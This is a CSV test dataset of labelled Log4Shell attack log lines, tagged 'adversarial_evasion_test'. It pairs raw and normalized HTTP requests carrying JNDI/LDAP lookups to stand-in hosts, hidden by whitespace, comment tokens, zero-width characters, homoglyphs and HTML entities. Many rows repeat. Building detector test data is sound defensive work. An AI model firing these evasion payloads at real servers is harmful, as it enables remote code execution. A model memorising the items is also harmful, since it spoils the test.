id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-002317,2026-05-17,adversarial_evasion,GET /?q=${jndi:	ldap://probe.example.net/tab-protocol} HTTP/1.1,get /?q=${jndi: ldap://probe.example.net/tab-protocol} http/1.1,1,log4shell,whitespace_injection,minimal_query,adversarial_evasion_test,critical
LS-002318,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndi:	ldap://probe.example.net/tab-protocol} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi: ldap://probe.example.net/tab-protocol} http/1.1 host: app.local,1,log4shell,whitespace_injection,uri_param,adversarial_evasion_test,critical
LS-002319,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://probe.example.net/tab-protocol} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi: ldap://probe.example.net/tab-protocol} | method: get | host: app.local | path: /search?q=boots,1,log4shell,whitespace_injection,user_agent,adversarial_evasion_test,critical
LS-002320,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://probe.example.net/tab-protocol},request from user-agent: ${jndi: ldap://probe.example.net/tab-protocol},1,log4shell,whitespace_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-002321,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:	ldap://probe.example.net/tab-protocol},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi: ldap://probe.example.net/tab-protocol},1,log4shell,whitespace_injection,x_api_version,adversarial_evasion_test,critical
LS-002322,2026-05-17,adversarial_evasion,GET /search?q=${jndi:	ldap://probe.example.net/tab-protocol} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi: ldap://probe.example.net/tab-protocol} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,whitespace_injection,path,adversarial_evasion_test,critical
LS-002323,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:	ldap://probe.example.net/tab-protocol},post /search http/1.1 host: app.local body: query=${jndi: ldap://probe.example.net/tab-protocol},1,log4shell,whitespace_injection,body,adversarial_evasion_test,critical
LS-002324,2026-05-17,adversarial_evasion,GET /?q=${jndi:	ldap://probe.example.net/tab-protocol} HTTP/1.1,get /?q=${jndi: ldap://probe.example.net/tab-protocol} http/1.1,1,log4shell,whitespace_injection,minimal_query,adversarial_evasion_test,critical
LS-002325,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndi:	ldap://probe.example.net/tab-protocol} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi: ldap://probe.example.net/tab-protocol} http/1.1 host: app.local,1,log4shell,whitespace_injection,uri_param,adversarial_evasion_test,critical
LS-002326,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://probe.example.net/tab-protocol} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi: ldap://probe.example.net/tab-protocol} | method: get | host: app.local | path: /home,1,log4shell,whitespace_injection,user_agent,adversarial_evasion_test,critical
LS-002327,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://probe.example.net/tab-protocol},request from user-agent: ${jndi: ldap://probe.example.net/tab-protocol},1,log4shell,whitespace_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-002328,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:	ldap://probe.example.net/tab-protocol},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi: ldap://probe.example.net/tab-protocol},1,log4shell,whitespace_injection,x_api_version,adversarial_evasion_test,critical
LS-002329,2026-05-17,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://probe.example.net/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://probe.example.net/comment-token} http/1.1,1,log4shell,comment_injection,minimal_query,adversarial_evasion_test,critical
LS-002330,2026-05-17,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://probe.example.net/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://probe.example.net/comment-token} http/1.1 host: app.local,1,log4shell,comment_injection,uri_param,adversarial_evasion_test,critical
LS-002331,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token} | Method: GET | Host: app.local | Path: /,request from user-agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token} | method: get | host: app.local | path: /,1,log4shell,comment_injection,user_agent,adversarial_evasion_test,critical
LS-002332,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token},request from user-agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token},1,log4shell,comment_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-002333,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${j${/**/}ndi:ldap://probe.example.net/comment-token},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /login | x-api-version: ${j${/**/}ndi:ldap://probe.example.net/comment-token},1,log4shell,comment_injection,x_api_version,adversarial_evasion_test,critical
LS-002334,2026-05-17,adversarial_evasion,GET /search?q=${j${/**/}ndi:ldap://probe.example.net/comment-token} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${j${/**/}ndi:ldap://probe.example.net/comment-token} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,comment_injection,path,adversarial_evasion_test,critical
LS-002335,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j${/**/}ndi:ldap://probe.example.net/comment-token},post /search http/1.1 host: app.local body: query=${j${/**/}ndi:ldap://probe.example.net/comment-token},1,log4shell,comment_injection,body,adversarial_evasion_test,critical
LS-002336,2026-05-17,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://probe.example.net/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://probe.example.net/comment-token} http/1.1,1,log4shell,comment_injection,minimal_query,adversarial_evasion_test,critical
LS-002337,2026-05-17,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://probe.example.net/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://probe.example.net/comment-token} http/1.1 host: app.local,1,log4shell,comment_injection,uri_param,adversarial_evasion_test,critical
LS-002338,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token} | method: get | host: app.local | path: /static/app.js,1,log4shell,comment_injection,user_agent,adversarial_evasion_test,critical
LS-002339,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token},request from user-agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token},1,log4shell,comment_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-002340,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${j${/**/}ndi:ldap://probe.example.net/comment-token},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /home | x-api-version: ${j${/**/}ndi:ldap://probe.example.net/comment-token},1,log4shell,comment_injection,x_api_version,adversarial_evasion_test,critical
LS-002341,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://probe.example.net/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://probe.example.net/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-002342,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://probe.example.net/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://probe.example.net/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-002343,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://probe.example.net/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://probe.example.net/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-002344,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://probe.example.net/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://probe.example.net/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-002345,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://probe.example.net/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://probe.example.net/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-002346,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://probe.example.net/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://probe.example.net/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-002347,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://probe.example.net/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://probe.example.net/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-002348,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://probe.example.net/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://probe.example.net/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-002349,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://probe.example.net/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://probe.example.net/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-002350,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://probe.example.net/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://probe.example.net/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-002351,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://probe.example.net/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://probe.example.net/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-002352,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://probe.example.net/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://probe.example.net/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-002353,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://probe.example.net/split-field},x-custom: ${jndi x-other: :ldap://probe.example.net/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002354,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://probe.example.net/split-field},x-custom: ${jndi x-other: :ldap://probe.example.net/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002355,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://probe.example.net/split-field},x-custom: ${jndi x-other: :ldap://probe.example.net/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002356,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://probe.example.net/split-field},x-custom: ${jndi x-other: :ldap://probe.example.net/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002357,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://probe.example.net/split-field},x-custom: ${jndi x-other: :ldap://probe.example.net/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002358,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://probe.example.net/split-field},x-custom: ${jndi x-other: :ldap://probe.example.net/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002359,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://probe.example.net/split-field},x-custom: ${jndi x-other: :ldap://probe.example.net/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002360,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://probe.example.net/split-field},x-custom: ${jndi x-other: :ldap://probe.example.net/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002361,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://probe.example.net/split-field},x-custom: ${jndi x-other: :ldap://probe.example.net/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002362,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://probe.example.net/split-field},x-custom: ${jndi x-other: :ldap://probe.example.net/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002363,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://probe.example.net/split-field},x-custom: ${jndi x-other: :ldap://probe.example.net/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002364,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://probe.example.net/split-field},x-custom: ${jndi x-other: :ldap://probe.example.net/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002461,2026-05-17,adversarial_evasion,GET /?q=${jnd‍i:ldap://lab-callback.example.org/zw-d} HTTP/1.1,get /?q=${jnd‍i:ldap://lab-callback.example.org/zw-d} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-002462,2026-05-17,adversarial_evasion,GET /api/check?debug=${jnd‍i:ldap://lab-callback.example.org/zw-d} HTTP/1.1 Host: app.local,get /api/check?debug=${jnd‍i:ldap://lab-callback.example.org/zw-d} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-002463,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://lab-callback.example.org/zw-d} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jnd‍i:ldap://lab-callback.example.org/zw-d} | method: get | host: app.local | path: /static/app.js,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-002464,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://lab-callback.example.org/zw-d},request from user-agent: ${jnd‍i:ldap://lab-callback.example.org/zw-d},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002465,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${jnd‍i:ldap://lab-callback.example.org/zw-d},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jnd‍i:ldap://lab-callback.example.org/zw-d},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-002466,2026-05-17,adversarial_evasion,GET /search?q=${jnd‍i:ldap://lab-callback.example.org/zw-d} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${jnd‍i:ldap://lab-callback.example.org/zw-d} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,zero_width_jndi,path,adversarial_evasion_test,critical
LS-002467,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jnd‍i:ldap://lab-callback.example.org/zw-d},post /search http/1.1 host: app.local body: query=${jnd‍i:ldap://lab-callback.example.org/zw-d},1,log4shell,zero_width_jndi,body,adversarial_evasion_test,critical
LS-002468,2026-05-17,adversarial_evasion,GET /?q=${jnd‍i:ldap://lab-callback.example.org/zw-d} HTTP/1.1,get /?q=${jnd‍i:ldap://lab-callback.example.org/zw-d} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-002469,2026-05-17,adversarial_evasion,GET /api/check?debug=${jnd‍i:ldap://lab-callback.example.org/zw-d} HTTP/1.1 Host: app.local,get /api/check?debug=${jnd‍i:ldap://lab-callback.example.org/zw-d} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-002470,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://lab-callback.example.org/zw-d} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jnd‍i:ldap://lab-callback.example.org/zw-d} | method: get | host: app.local | path: /,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-002471,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://lab-callback.example.org/zw-d},request from user-agent: ${jnd‍i:ldap://lab-callback.example.org/zw-d},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002472,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${jnd‍i:ldap://lab-callback.example.org/zw-d},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: / | x-api-version: ${jnd‍i:ldap://lab-callback.example.org/zw-d},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-002473,2026-05-17,adversarial_evasion,GET /?q=${ϳndi:ldap://lab-callback.example.org/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://lab-callback.example.org/greek-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,adversarial_evasion_test,critical
LS-002474,2026-05-17,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://lab-callback.example.org/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://lab-callback.example.org/greek-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,adversarial_evasion_test,critical
LS-002475,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://lab-callback.example.org/greek-j} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${ϳndi:ldap://lab-callback.example.org/greek-j} | method: get | host: app.local | path: /home,1,log4shell,homoglyph_jndi,user_agent,adversarial_evasion_test,critical
LS-002476,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://lab-callback.example.org/greek-j},request from user-agent: ${ϳndi:ldap://lab-callback.example.org/greek-j},1,log4shell,homoglyph_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002477,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${ϳndi:ldap://lab-callback.example.org/greek-j},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /home | x-api-version: ${ϳndi:ldap://lab-callback.example.org/greek-j},1,log4shell,homoglyph_jndi,x_api_version,adversarial_evasion_test,critical
LS-002478,2026-05-17,adversarial_evasion,GET /search?q=${ϳndi:ldap://lab-callback.example.org/greek-j} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${ϳndi:ldap://lab-callback.example.org/greek-j} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,homoglyph_jndi,path,adversarial_evasion_test,critical
LS-002479,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${ϳndi:ldap://lab-callback.example.org/greek-j},post /search http/1.1 host: app.local body: query=${ϳndi:ldap://lab-callback.example.org/greek-j},1,log4shell,homoglyph_jndi,body,adversarial_evasion_test,critical
LS-002480,2026-05-17,adversarial_evasion,GET /?q=${ϳndi:ldap://lab-callback.example.org/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://lab-callback.example.org/greek-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,adversarial_evasion_test,critical
LS-002481,2026-05-17,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://lab-callback.example.org/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://lab-callback.example.org/greek-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,adversarial_evasion_test,critical
LS-002482,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://lab-callback.example.org/greek-j} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${ϳndi:ldap://lab-callback.example.org/greek-j} | method: get | host: app.local | path: /static/app.js,1,log4shell,homoglyph_jndi,user_agent,adversarial_evasion_test,critical
LS-002483,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://lab-callback.example.org/greek-j},request from user-agent: ${ϳndi:ldap://lab-callback.example.org/greek-j},1,log4shell,homoglyph_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002484,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${ϳndi:ldap://lab-callback.example.org/greek-j},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /home | x-api-version: ${ϳndi:ldap://lab-callback.example.org/greek-j},1,log4shell,homoglyph_jndi,x_api_version,adversarial_evasion_test,critical
LS-002485,2026-05-17,adversarial_evasion,GET /?q=${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} HTTP/1.1,get /?q=${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-002486,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} HTTP/1.1 Host: app.local,get /api/check?debug=${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-002487,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} | Method: GET | Host: app.local | Path: /,request from user-agent: ${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} | method: get | host: app.local | path: /,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-002488,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw},request from user-agent: ${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002489,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /metrics | x-api-version: ${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-002490,2026-05-17,adversarial_evasion,GET /search?q=${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,zero_width_jndi,path,adversarial_evasion_test,critical
LS-002491,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw},post /search http/1.1 host: app.local body: query=${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw},1,log4shell,zero_width_jndi,body,adversarial_evasion_test,critical
LS-002492,2026-05-17,adversarial_evasion,GET /?q=${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} HTTP/1.1,get /?q=${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-002493,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} HTTP/1.1 Host: app.local,get /api/check?debug=${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-002494,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw} | method: get | host: app.local | path: /login,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-002495,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw},request from user-agent: ${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002496,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: / | x-api-version: ${j​n‌d‍i:ldap://lab-callback.example.org/multi-zw},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-002497,2026-05-17,adversarial_evasion,GET /?q=${&#x6A;ndi:ldap://lab-callback.example.org/html-hex} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/html-hex} http/1.1,1,log4shell,html_entity_jndi,minimal_query,adversarial_evasion_test,critical
LS-002498,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#x6A;ndi:ldap://lab-callback.example.org/html-hex} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/html-hex} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,adversarial_evasion_test,critical
LS-002499,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://lab-callback.example.org/html-hex} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://lab-callback.example.org/html-hex} | method: get | host: app.local | path: /home,1,log4shell,html_entity_jndi,user_agent,adversarial_evasion_test,critical
LS-002500,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://lab-callback.example.org/html-hex},request from user-agent: ${jndi:ldap://lab-callback.example.org/html-hex},1,log4shell,html_entity_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002501,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${&#x6A;ndi:ldap://lab-callback.example.org/html-hex},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://lab-callback.example.org/html-hex},1,log4shell,html_entity_jndi,x_api_version,adversarial_evasion_test,critical
